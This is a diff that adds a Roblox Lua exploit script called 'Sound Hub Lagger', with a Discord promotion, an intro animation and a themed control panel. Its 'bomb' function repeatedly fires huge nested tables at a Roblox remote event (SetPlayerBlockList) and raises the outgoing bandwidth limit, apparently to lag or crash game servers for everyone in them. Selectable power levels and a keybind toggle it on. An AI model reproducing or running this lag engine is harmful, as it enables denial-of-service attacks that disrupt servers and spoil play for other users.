@@ -1,0 +1,701 @@
+-- ═══════════════════════════════════════════════════════════════
+--  SOUND HUB | v3.5
+--  Modern minimalist UI · 4 themes (B&W, Red, Blue, Pink)
+--  All original mechanics preserved
+-- ═══════════════════════════════════════════════════════════════
+
+--[[
+========================================
+
+╔════════════════════════╗
+║          Cypher Spectre ║ EnvSight      ║
+╚════════════════════════╝
+Script Deobfuscated by Cypher Spectre
+Version: EnvSight
+Author on Discord / TikTok:
+@roman666cabj
+https://discord.gg/HCxUsWKJte
+
+========================================
+]]
+
+--// Sound Hub Lagger - TERROR PANEL WITH INTENSE RAIN (200x100)
+--// EFFECTS: Fast rain, fixed title (no animation)
+--// NEW: Customizable key/button selector (click the box and press the desired key)
+
+-- ============================================================================
+-- WAIT FOR THE INTRO TO FINISH BEFORE LOADING THE LAGGER
+-- ============================================================================
+local introFinished = false
+
+-- ============================================================================
+-- INTRO SEQUENCE
+-- ============================================================================
+task.spawn(function()
+    local TweenService = game:GetService("TweenService")
+    local CoreGui      = game:GetService("CoreGui")
+    local SoundService = game:GetService("SoundService")
+
+    local SONG_ID        = "rbxassetid://126107591945718"
+    local SONG_VOL       = 0.7
+    local INTRO_DURATION = 3.2
+    local BLINK_INTERVAL = 0.15
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size   = 56
+    blur.Parent = game:GetService("Lighting")
+
+    local introGui = Instance.new("ScreenGui")
+    introGui.Name            = "SoundHubIntro"
+    introGui.ResetOnSpawn    = false
+    introGui.IgnoreGuiInset  = true
+    introGui.ZIndexBehavior  = Enum.ZIndexBehavior.Global
+    introGui.Parent          = CoreGui
+
+    local overlay = Instance.new("Frame", introGui)
+    overlay.Size = UDim2.new(1,0,1,0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    overlay.BackgroundTransparency = 0.55
+    overlay.BorderSizePixel = 0
+    overlay.ZIndex = 100
+
+    -- Main text "SOUND HUB" in the reference image color
+    local tag = Instance.new("TextLabel", introGui)
+    tag.Size                   = UDim2.new(0, 520, 0, 94)
+    tag.Position               = UDim2.new(0.5, -260, 0.5, -56)
+    tag.BackgroundTransparency = 1
+    tag.Text                   = "SOUND HUB"
+    tag.Font                   = Enum.Font.GothamBlack
+    tag.TextSize               = 84
+    tag.TextColor3             = Color3.fromRGB(186, 3, 253)      -- Reference image purple color
+    tag.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
+    tag.TextStrokeTransparency = 0.7
+    tag.TextXAlignment         = Enum.TextXAlignment.Center
+    tag.TextTransparency       = 0
+    tag.ZIndex                 = 110
+
+    -- Divider line in the reference image color
+    local line = Instance.new("Frame", introGui)
+    line.Size = UDim2.new(0, 340, 0, 2)                            -- Slightly thicker
+    line.Position = UDim2.new(0.5, -170, 0.5, 36)
+    line.BackgroundColor3 = Color3.fromRGB(186, 3, 253)           -- Reference image purple color
+    line.BackgroundTransparency = 0.1                              -- Almost opaque to stand out
+    line.BorderSizePixel = 0
+    line.ZIndex = 110
+
+    -- Subtitle "v3.5" in the reference image color
+    local sub = Instance.new("TextLabel", introGui)
+    sub.Size                   = UDim2.new(0, 520, 0, 30)
+    sub.Position               = UDim2.new(0.5, -260, 0.5, 42)
+    sub.BackgroundTransparency = 1
+    sub.Text                   = "v3.5"
+    sub.Font                   = Enum.Font.GothamBold
+    sub.TextSize               = 18
+    sub.TextColor3             = Color3.fromRGB(186, 3, 253)      -- Reference image purple color
+    sub.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
+    sub.TextStrokeTransparency = 0.5
+    sub.TextXAlignment         = Enum.TextXAlignment.Center
+    sub.TextTransparency       = 0
+    sub.ZIndex                 = 110
+
+    local snd = Instance.new("Sound")
+    snd.SoundId            = SONG_ID
+    snd.Volume             = SONG_VOL
+    snd.Looped             = false
+    snd.RollOffMode        = Enum.RollOffMode.InverseTapered
+    snd.RollOffMinDistance = 10000
+    snd.RollOffMaxDistance = 10000
+    snd.TimePosition       = 34
+    snd.Parent             = SoundService
+    if not snd.IsLoaded then
+        local loaded = false
+        task.spawn(function() snd.Loaded:Wait(); loaded = true end)
+        local t = 0
+        while not loaded and t < 0.5 do task.wait(0.05); t = t + 0.05 end
+    end
+    pcall(function() snd:Play() end)
+
+    local blinkActive = true
+    local visible     = true
+    task.spawn(function()
+        while blinkActive do
+            task.wait(BLINK_INTERVAL)
+            visible = not visible
+            tag.TextTransparency  = visible and 0 or 1
+            sub.TextTransparency  = visible and 0 or 0.5
+            line.BackgroundTransparency = visible and 0.1 or 0.85
+        end
+    end)
+
+    task.wait(INTRO_DURATION)
+
+    blinkActive = false
+    local fadeInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    tag.TextTransparency = 0
+    TweenService:Create(tag,     fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(sub,     fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(line,    fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(overlay, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(snd,     TweenInfo.new(0.6), {Volume = 0}):Play()
+    TweenService:Create(blur,    fadeInfo, {Size = 0}):Play()
+    task.wait(0.7)
+
+    pcall(function() snd:Stop(); snd:Destroy() end)
+    pcall(function() blur:Destroy() end)
+    pcall(function() introGui:Destroy() end)
+
+    local pg = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+    local hubGui = pg:FindFirstChild("SoundHubGUI")
+    if hubGui then
+        local m = hubGui:FindFirstChild("Main")
+        if m then m.Visible = true end
+        for _, child in ipairs(hubGui:GetChildren()) do
+            if child:IsA("Frame") and child.Name ~= "Main" and child.ZIndex == 2 then
+                child.Visible = true
+            end
+        end
+    end
+
+    -- ✅ INTRO FINISHED - ALLOW LAGGER TO LOAD
+    introFinished = true
+end)
+
+-- ============================================================================
+-- WAIT FOR THE INTRO TO FINISH BEFORE LOADING THE LAGGER
+-- ============================================================================
+while not introFinished do
+    task.wait(0.1)
+end
+
+--// SERVICES
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local ConfigFile = "SoundHubLaggerConfig.json"
+
+-- ⚙️ EXACT POWER: 25 - 32 - 70
+local LEVELS = {
+    Low     = { poder = 25 },
+    Mid     = { poder = 32 },
+    High    = { poder = 70 }
+}
+
+local keybind = Enum.KeyCode.M          -- Default key (keyboard or gamepad)
+local listeningForInput = false         -- Listening mode to change the key
+local laggerActive = false
+local lagThread = nil
+local currentLevel = "Low"
+local windowLocked = false
+
+-- 🎨 STYLE - PURPLE THEME BACKGROUND
+local UI_CONFIG = {
+    MainBg       = Color3.fromRGB(186, 3, 253),      -- Reference image purple color
+    TitleColor   = Color3.fromRGB(255, 255, 255),
+    TextColor    = Color3.fromRGB(255, 255, 255),
+    ButtonInact  = Color3.fromRGB(119, 2, 161),      -- Darker purple for inactive buttons
+    ButtonAct    = Color3.fromRGB(0, 0, 0),
+    ToggleOff    = Color3.fromRGB(100, 100, 100),
+    ToggleOn     = Color3.fromRGB(0, 0, 0),
+    LockColor    = Color3.fromRGB(255, 255, 255),
+    UnlockColor  = Color3.fromRGB(220, 160, 240),
+    Font         = Enum.Font.GothamBold,
+    BorderColor  = Color3.fromRGB(166, 2, 226),      -- Dark purple border
+    GlowColor    = Color3.fromRGB(255, 50, 50),
+    RainColor    = Color3.fromRGB(220, 160, 240),    -- Light purple rain
+    SelectorBg   = Color3.fromRGB(119, 2, 161),      -- Purple selector
+    SelectorAct  = Color3.fromRGB(0, 0, 0),
+}
+
+-- 💾 CONFIG
+local function SaveConfig()
+    local data = {
+        Keybind = keybind.Name,
+        Nivel = currentLevel,
+        Bloqueado = windowLocked
+    }
+    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
+end
+
+local function LoadConfig()
+    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+        pcall(function()
+            local data = HttpService:JSONDecode(readfile(ConfigFile))
+            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
+            currentLevel = data.Nivel or "Low"
+            windowLocked = data.Bloqueado or false
+        end)
+    end
+end
+LoadConfig()
+
+-- ⚠️ LAG ENGINE (stable)
+local function bomb(poder)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
+    local max = math.min(12000, poder * 50)
+    for i = 1, max do table.insert(main, spam) end
+    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
+end
+
+-- 🧩 ELEMENTS
+local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
+local titleLabel, versionLabel, textKeybind, keybindButton, toggleClick
+
+-- Update functions
+local function updateLevelButtons()
+    if currentLevel == "Low" then
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnLow.TextColor3 = Color3.fromRGB(255,255,255)
+        btnLow.BorderSizePixel = 0
+    else
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnLow.TextColor3 = Color3.fromRGB(255,255,255)
+        btnLow.BorderSizePixel = 1
+        btnLow.BorderColor3 = UI_CONFIG.BorderColor
+    end
+    if currentLevel == "Mid" then
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnMid.TextColor3 = Color3.fromRGB(255,255,255)
+        btnMid.BorderSizePixel = 0
+    else
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnMid.TextColor3 = Color3.fromRGB(255,255,255)
+        btnMid.BorderSizePixel = 1
+        btnMid.BorderColor3 = UI_CONFIG.BorderColor
+    end
+    if currentLevel == "High" then
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
+        btnHigh.BorderSizePixel = 0
+    else
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
+        btnHigh.BorderSizePixel = 1
+        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+    end
+end
+
+local function updateSwitch()
+    if toggleContainer then
+        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    end
+    if toggleBall then
+        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+        if laggerActive then
+            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
+        else
+            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
+        end
+    end
+    if toggleClick then
+        toggleClick.Text = laggerActive and "ON" or "OFF"
+        if laggerActive then
+            toggleClick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+        else
+            toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        end
+    end
+end
+
+local function updateLock()
+    lockButton.Text = windowLocked and "Lock" or "Unlock"
+    lockButton.TextColor3 = windowLocked and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
+end
+
+local function updateKeybindButton()
+    if keybindButton then
+        local display = keybind.Name
+        if display:match("Button") then
+            display = display:gsub("Button", "")
+        end
+        keybindButton.Text = display
+    end
+end
+
+local function toggleLagger()
+    laggerActive = not laggerActive
+    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = targetPos,
+        BackgroundColor3 = targetColor
+    }):Play()
+    TweenService:Create(toggleContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundColor3 = targetColor
+    }):Play()
+
+    toggleClick.Text = laggerActive and "ON" or "OFF"
+    if laggerActive then
+        toggleClick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+    else
+        toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+    end
+
+    if laggerActive then
+        if lagThread then task.cancel(lagThread) end
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+                bomb(LEVELS[currentLevel].poder)
+                task.wait(0.18)
+            end
+        end)
+    else
+        if lagThread then task.cancel(lagThread); lagThread = nil end
+    end
+end
+
+-- 🖼️ INTERFACE - PANEL WITH INTENSE RAIN AND PURPLE BACKGROUND
+if CoreGui:FindFirstChild("SoundHubLagger_UI") then CoreGui.SoundHubLagger_UI:Destroy() end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SoundHubLagger_UI"
+screenGui.Parent = CoreGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.ResetOnSpawn = false
+
+-- Panel: 200 x 100
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = UI_CONFIG.MainBg    -- PURPLE
+mainFrame.BorderSizePixel = 2
+mainFrame.BorderColor3 = UI_CONFIG.BorderColor
+mainFrame.Size = UDim2.new(0, 200, 0, 100)
+mainFrame.Position = UDim2.new(0.15, 0, 0.5, -50)
+mainFrame.Parent = screenGui
+mainFrame.ClipsDescendants = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+
+-- 🌧️ REALISTIC RAIN
+local rainParticles = {}
+local rainCanvas = Instance.new("Frame")
+rainCanvas.Name = "RainCanvas"
+rainCanvas.BackgroundTransparency = 1
+rainCanvas.Size = UDim2.new(1, 0, 1, 0)
+rainCanvas.Parent = mainFrame
+rainCanvas.ZIndex = 0
+
+for i = 1, 50 do
+    local drop = Instance.new("Frame")
+    drop.Name = "RainDrop_" .. i
+    drop.BackgroundColor3 = UI_CONFIG.RainColor
+    drop.BackgroundTransparency = 0.1 + math.random() * 0.3
+    drop.Size = UDim2.new(0, 1 + math.random() * 1.5, 0, 4 + math.random() * 6)
+    drop.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    drop.BorderSizePixel = 0
+    drop.Parent = rainCanvas
+    drop.ZIndex = 0
+
+    local speed = 0.5 + math.random() * 0.7
+    local drift = (math.random() - 0.5) * 0.1
+
+    table.insert(rainParticles, {
+        frame = drop,
+        speed = speed,
+        drift = drift
+    })
+end
+
+RunService.Heartbeat:Connect(function(dt)
+    for _, p in ipairs(rainParticles) do
+        if p.frame and p.frame.Parent then
+            local newY = p.frame.Position.Y.Scale + p.speed * dt * 1.5
+            if newY > 1 then
+                newY = -0.1
+                p.frame.Position = UDim2.new(math.random(), 0, newY, 0)
+                p.frame.Size = UDim2.new(0, 1 + math.random() * 1.5, 0, 4 + math.random() * 6)
+                p.frame.BackgroundTransparency = 0.1 + math.random() * 0.3
+            else
+                p.frame.Position = UDim2.new(
+                    p.frame.Position.X.Scale + p.drift * dt * 0.05,
+                    0,
+                    newY,
+                    0
+                )
+            end
+        end
+    end
+end)
+
+-- ═══════════════════════════════════════════
+-- TITLE "SOUND HUB LAGGER" (FIXED, NO ANIMATION)
+-- ═══════════════════════════════════════════
+titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 10, 0, 2)
+titleLabel.Size = UDim2.new(1, -45, 0, 18)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.Text = "SOUND HUB LAGger"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White over purple
+titleLabel.TextSize = 13
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.ZIndex = 1
+
+-- ═══════════════════════════════════════════
+-- "https://discord.gg/HCxUsWKJte" BELOW TITLE
+-- ═══════════════════════════════════════════
+versionLabel = Instance.new("TextLabel", mainFrame)
+versionLabel.BackgroundTransparency = 1
+versionLabel.Position = UDim2.new(0, 10, 0, 20)  -- Right below title
+versionLabel.Size = UDim2.new(0, 130, 0, 12)
+versionLabel.Font = UI_CONFIG.Font
+versionLabel.Text = "discord.gg/HCxUsWKJte"
+versionLabel.TextColor3 = Color3.fromRGB(230, 200, 255)  -- Light purple/white
+versionLabel.TextSize = 7.5
+versionLabel.TextXAlignment = Enum.TextXAlignment.Left
+versionLabel.ZIndex = 1
+
+-- Lock button ("Lock"/"Unlock")
+lockButton = Instance.new("TextButton", mainFrame)
+lockButton.BackgroundTransparency = 1
+lockButton.Position = UDim2.new(1, -50, 0, 3)
+lockButton.Size = UDim2.new(0, 45, 0, 18)
+lockButton.Font = UI_CONFIG.Font
+lockButton.TextSize = 10
+lockButton.TextColor3 = UI_CONFIG.TextColor
+lockButton.AutoButtonColor = false
+lockButton.ZIndex = 1
+lockButton.MouseButton1Click:Connect(function()
+    windowLocked = not windowLocked
+    updateLock()
+    SaveConfig()
+end)
+updateLock()
+
+-- ═══════════════════════════════════════════
+-- ROW "KEYBIND FOR LAGGER • [box] [switch]"
+-- ═══════════════════════════════════════════
+textKeybind = Instance.new("TextLabel", mainFrame)
+textKeybind.BackgroundTransparency = 1
+textKeybind.Position = UDim2.new(0, 10, 0, 38)
+textKeybind.Size = UDim2.new(0, 80, 0, 16)
+textKeybind.Font = UI_CONFIG.Font
+textKeybind.Text = "KEYBIND FOR LAGGER •"
+textKeybind.TextColor3 = UI_CONFIG.TextColor
+textKeybind.TextSize = 8
+textKeybind.TextXAlignment = Enum.TextXAlignment.Left
+textKeybind.ZIndex = 1
+
+-- Key selector button
+keybindButton = Instance.new("TextButton", mainFrame)
+keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
+keybindButton.Position = UDim2.new(0, 100, 0, 38)   -- Position X=100
+keybindButton.Size = UDim2.new(0, 24, 0, 16)
+keybindButton.Font = UI_CONFIG.Font
+keybindButton.Text = "M"
+keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
+keybindButton.TextSize = 9
+keybindButton.AutoButtonColor = false
+keybindButton.ZIndex = 1
+Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 3)
+updateKeybindButton()
+
+-- SWITCH (container)
+toggleContainer = Instance.new("Frame", mainFrame)
+toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+toggleContainer.Position = UDim2.new(1, -50, 0, 38)
+toggleContainer.Size = UDim2.new(0, 42, 0, 20)
+toggleContainer.ZIndex = 1
+Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)
+
+-- Sliding ball
+toggleBall = Instance.new("Frame", toggleContainer)
+toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+toggleBall.Size = UDim2.new(0, 18, 0, 18)
+toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
+toggleBall.ZIndex = 1
+Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)
+
+-- Button with ON/OFF text and solid background
+toggleClick = Instance.new("TextButton", toggleContainer)
+toggleClick.BackgroundTransparency = 0
+toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+toggleClick.Size = UDim2.new(1,0,1,0)
+toggleClick.ZIndex = 2
+toggleClick.Font = UI_CONFIG.Font
+toggleClick.Text = "OFF"
+toggleClick.TextSize = 9
+toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+toggleClick.TextXAlignment = Enum.TextXAlignment.Center
+toggleClick.TextYAlignment = Enum.TextYAlignment.Center
+toggleClick.MouseButton1Click:Connect(toggleLagger)
+toggleClick.AutoButtonColor = false
+local corner = Instance.new("UICorner", toggleClick)
+corner.CornerRadius = UDim.new(1,0)
+
+-- ═══════════════════════════════════════════
+-- KEY SELECTOR LISTENER
+-- ═══════════════════════════════════════════
+keybindButton.MouseButton1Click:Connect(function()
+    if listeningForInput then return end
+    listeningForInput = true
+    keybindButton.Text = "..."
+    keybindButton.BackgroundColor3 = UI_CONFIG.GlowColor
+    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
+end)
+
+local inputConnection
+inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
+    if not listeningForInput then return end
+    if gp then return end
+
+    local newKey = nil
+    if input.KeyCode ~= Enum.KeyCode.Unknown then
+        newKey = input.KeyCode
+    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
+        newKey = input.KeyCode
+    end
+
+    if newKey then
+        keybind = newKey
+        updateKeybindButton()
+        SaveConfig()
+        listeningForInput = false
+        keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
+        keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
+    end
+end)
+
+-- LOW/MID/HIGH Buttons
+local btnY = 65
+local btnW = 60
+local btnH = 24
+local espaciado = 5
+local margenIzq = 5
+
+local function applyHoverEffect(btn)
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {
+            BackgroundColor3 = UI_CONFIG.GlowColor,
+            TextColor3 = Color3.fromRGB(255,255,255)
+        }):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        if currentLevel == "Low" and btn == btnLow then
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = UI_CONFIG.ButtonAct,
+                TextColor3 = Color3.fromRGB(255,255,255)
+            }):Play()
+        elseif currentLevel == "Mid" and btn == btnMid then
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = UI_CONFIG.ButtonAct,
+                TextColor3 = Color3.fromRGB(255,255,255)
+            }):Play()
+        elseif currentLevel == "High" and btn == btnHigh then
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = UI_CONFIG.ButtonAct,
+                TextColor3 = Color3.fromRGB(255,255,255)
+            }):Play()
+        else
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = UI_CONFIG.ButtonInact,
+                TextColor3 = Color3.fromRGB(255,255,255)
+            }):Play()
+        end
+    end)
+end
+
+btnLow = Instance.new("TextButton", mainFrame)
+btnLow.Size = UDim2.new(0, btnW, 0, btnH)
+btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
+btnLow.Font = UI_CONFIG.Font
+btnLow.Text = "LOW"
+btnLow.TextColor3 = Color3.fromRGB(255,255,255)
+btnLow.TextSize = 10
+btnLow.AutoButtonColor = false
+btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnLow.BorderSizePixel = 1
+btnLow.BorderColor3 = UI_CONFIG.BorderColor
+btnLow.ZIndex = 1
+Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
+btnLow.MouseButton1Click:Connect(function()
+    currentLevel = "Low"
+    updateLevelButtons()
+    SaveConfig()
+end)
+applyHoverEffect(btnLow)
+
+btnMid = Instance.new("TextButton", mainFrame)
+btnMid.Size = UDim2.new(0, btnW, 0, btnH)
+btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
+btnMid.Font = UI_CONFIG.Font
+btnMid.Text = "MID"
+btnMid.TextColor3 = Color3.fromRGB(255,255,255)
+btnMid.TextSize = 10
+btnMid.AutoButtonColor = false
+btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnMid.BorderSizePixel = 1
+btnMid.BorderColor3 = UI_CONFIG.BorderColor
+btnMid.ZIndex = 1
+Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
+btnMid.MouseButton1Click:Connect(function()
+    currentLevel = "Mid"
+    updateLevelButtons()
+    SaveConfig()
+end)
+applyHoverEffect(btnMid)
+
+btnHigh = Instance.new("TextButton", mainFrame)
+btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
+btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
+btnHigh.Font = UI_CONFIG.Font
+btnHigh.Text = "HIGH"
+btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
+btnHigh.TextSize = 10
+btnHigh.AutoButtonColor = false
+btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnHigh.BorderSizePixel = 1
+btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+btnHigh.ZIndex = 1
+Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
+btnHigh.MouseButton1Click:Connect(function()
+    currentLevel = "High"
+    updateLevelButtons()
+    SaveConfig()
+end)
+applyHoverEffect(btnHigh)
+
+updateLevelButtons()
+updateSwitch()
+
+-- DRAGGING
+local isDragging, dragStart, startPos = false, nil, nil
+mainFrame.InputBegan:Connect(function(input)
+    if windowLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not isDragging or windowLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+    end
+end)
+
+-- 🎮 ACTIVATION WITH SELECTED KEY
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
+        toggleLagger()
+    end
+end)
